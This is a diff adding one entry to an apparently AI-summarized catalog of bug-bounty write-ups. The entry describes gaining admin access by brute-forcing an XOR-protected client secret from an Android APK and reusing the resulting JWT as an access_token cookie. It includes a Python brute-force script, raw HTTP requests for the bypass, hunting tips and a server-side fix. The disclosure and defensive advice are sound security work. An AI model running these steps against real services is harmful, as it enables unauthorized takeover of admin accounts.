@@ -1,5 +1,45 @@
 [
   {
+    "id": "2235492f9c8f",
+    "title": "$10,000 Bounty: How I Chained Weak APK Encryption and a JWT Cookie for Full Admin Access",
+    "url": "https://medium.com/@DarkyOS/10-000-bounty-how-i-chained-weak-apk-encryption-and-a-jwt-cookie-for-full-admin-access-fccd7496a650",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Ahmed Ghadban"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-09-30T07:41:30.000Z",
+    "added_at": "2026-09-30T07:45:43.460Z",
+    "categories": [
+      "auth-bypass"
+    ],
+    "severity": "critical",
+    "difficulty": "advanced",
+    "summary_en": "A weak XOR‑encrypted client secret in the Android app allowed the researcher to retrieve a JWT, then reuse that token as an access_token cookie to bypass the admin dashboard authentication and gain full admin control.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause was three‑fold: (1) The mobile app stored the client_id and client_secret inside the APK and protected them only with a simple XOR cipher, which is trivial to brute‑force. (2) The authentication server issued a JWT without audience (aud) or scope restrictions, so the same token was valid for any service that accepted it. (3) The web admin panel trusted a cookie named access_token and did not verify that the token came from the API, allowing the JWT to be presented as a cookie and bypass login.",
+      "walkthrough": "RECON\nStep 1: Download the APK and decompile it with apktool to view the .smali files. (APK = Android package, .smali = assembly‑like code).\nStep 2: Search the decompiled code for hard‑coded strings and locate an encrypted client_id and client_secret. (Hard‑coded = written directly in the binary).\n\nDISCOVERY\nStep 3: Extract the ciphertext arrays from the smali file. (Ciphertext = encrypted bytes).\nStep 4: Write a Python brute‑force script to try every 16‑bit key.\n```python\nciphertext_id = [...]\nciphertext_secret = [...]\nfor key in range(65536):\n    decrypted_id = ''.join([chr(b ^ key) for b in ciphertext_id])\n    if \"expected_prefix\" in decrypted_id:\n        print(f\"[+] Key found: {key}\")\n        print(f\"[+] Client ID: {decrypted_id}\")\n        break\n```\nWhy: XOR with a 16‑bit key repeats every 65536 possibilities; trying each key reveals the plaintext when the result matches a known pattern.\nStep 5: Run the script; it prints the correct key and the clear‑text client_id and client_secret.\n\nEXPLOITATION\nStep 6: Use the recovered credentials to call the mobile API authentication endpoint. (Endpoint = URL that processes a request).\nStep 7: Send an HTTP POST with the credentials.\n```\nPOST /auth/login HTTP/1.1\nHost: api.prod.target.com\nContent-Type: application/json\n\n{\"client_id\":\"<id>\",\"client_secret\":\"<secret>\"}\n```\nWhy: The server validates the credentials and returns a JWT in the JSON response. (JWT = JSON Web Token, a signed token that carries claims).\nStep 8: Capture the response:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n{\"access_token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\"token_type\":\"Bearer\",\"expires_in\":3600}\n```\nWhy: The field name is access_token, and the value is the JWT.\nStep 9: Test the token on the API by adding an Authorization header.\n```\nGET /admin/users HTTP/1.1\nHost: api.prod.target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n```\nWhy: The API accepts the token in a Bearer header and grants admin‑level API access.\n\nESCALATION\nStep 10: Browse to the web admin interface at admin.prod.target.com.\nStep 11: Attempt to log in using the same JWT in a Bearer header; receive 401 Unauthorized.\nStep 12: Replace the Authorization header with a Cookie header named access_token containing the JWT.\n```\nGET /admin/dashboard HTTP/1.1\nHost: admin.prod.target.com\nCookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n```\nWhy: The dashboard’s middleware reads the access_token cookie, validates the JWT, and grants a session, effectively bypassing the login page.\nStep 13: The dashboard loads, confirming full Super Admin privileges.",
+      "example": "Example target: https://admin.example.com uses the same pattern. The mobile API at https://api.example.com returns a JWT in the JSON key access_token. The web dashboard reads a cookie named access_token and trusts any JWT it finds. Attack steps: (1) Obtain a valid JWT from the API (e.g., by registering a user). (2) Send a request to https://admin.example.com/dashboard with the header:\n```\nCookie: access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...\n```\nWhy it works: The server does not check the token’s audience or source, so the API token is accepted as a web session token, granting admin access.",
+      "takeaway": "When hunting, look for hard‑coded secrets in mobile binaries and for JWTs that lack audience or scope claims. Check whether different services (API vs web) share the same token format and whether the web side accepts the token via a cookie whose name matches the JSON key. Tools such as apktool, JADX, Burp Suite, and jwt.io help discover these issues. Variants include tokens passed in query parameters or localStorage that are reused across sub‑domains. A common beginner mistake is assuming that a token accepted in an Authorization header will be rejected in a cookie; always test both locations.",
+      "fix": "Fix the mobile app by removing hard‑coded client credentials and retrieving them from a secure backend (e.g., via OAuth client‑credentials flow). On the authentication server, include an audience (aud) claim and scope restrictions in the JWT and verify them on every service. The web dashboard should only accept tokens presented in the Authorization header and should reject a token presented as a cookie unless it is a dedicated session cookie with proper SameSite and HttpOnly flags. Example server‑side check (pseudo‑code):\n```\nif request.headers.get('Authorization'):\n    token = extract_bearer(request.headers['Authorization'])\nelif request.cookies.get('access_token'):\n    # reject cookie usage for admin UI\n    abort(401)\nvalidate_jwt(token, expected_audience='api.prod.target.com')\n```",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "W hen hunting for high-impact bugs, stopping at the first sign of access usually leaves money on the table. What started as a medium-severity API access vulnerability in an Android application turned into a full-scale admin dashboard takeover, yielding a $10,000 bounty. Here is the breakdown of how reversing an APK, brute-forcing XOR encryption, and a simple HTTP cookie manipulation led to full control over the target application. ## Phase 1: Reversing the APK & Discovering Secrets The target was a mobile application with a complex backend. The first step in mobile methodology is static analys",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "b8eb6ef16a87",
     "title": "When a Production Backend Has No Authentication: Internal Disclosure and Unauthenticated State…",
     "url": "https://medium.com/@redhunter01/when-a-production-backend-has-no-authentication-internal-disclosure-and-unauthenticated-state-2a8d5a68c2c6",
